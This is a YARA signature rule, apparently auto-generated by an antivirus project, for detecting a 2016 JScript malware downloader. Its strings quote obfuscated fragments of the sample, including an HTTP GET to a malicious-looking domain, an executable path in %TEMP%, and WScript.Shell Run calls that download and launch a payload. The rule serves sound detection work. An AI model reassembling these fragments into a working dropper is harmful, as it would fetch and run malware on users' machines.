rule sig_20160330_295587b8067d0b854c84c2ab2c9d6560 {
  meta:
    description = "datamaliciousorder - file 20160330_295587b8067d0b854c84c2ab2c9d6560.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e5c110d2ff22b22f3f16575db880655abd9309b78dd2545d0fe65873b6f8cce0"

  strings:
    $s1  = "w[TL](\"GET\", \"http://greenellebox.com/a1odk\", false);" fullword ascii
    $s2  = "function Fu() {return z0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"7o1h5gfaAc.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[M1](Q() * 11); if (w[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var z0 = function bP() {return WScript[II](\"WScript.Shell\");}(), wa = 11;" fullword ascii
    $s5  = "function l(xx, q0){m = m * 1; return xx - q0;};" fullword ascii
    $s6  = "function lv(){return \"\" + R;};" fullword ascii
    $s7  = "function jB() {return ((vU == true) && (vU == bv)) ? 1 : m;};" fullword ascii
    $s8  = "function t(s){z0[\"Run\"](s, m, m);};" fullword ascii
    $s9  = "function M()" fullword ascii
    $s10 = " while (q){" fullword ascii
    $s11 = "function Q(){return 22;};" fullword ascii
    $s12 = "var Q0 = new this[\"Date\"]();" fullword ascii
    $s13 = "function V(){return II;};" fullword ascii
    $s14 = "return l(v, N);" fullword ascii
    $s15 = "function J(f) {var CZ = (1, 2, 3, 4, 5, f); return CZ;};" fullword ascii
    $s16 = "var tp = false;" fullword ascii
    $s17 = "var vU = false;" fullword ascii
    $s18 = "vU = true; " fullword ascii
    $s19 = "var bv = false;" fullword ascii
    $s20 = "bv = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}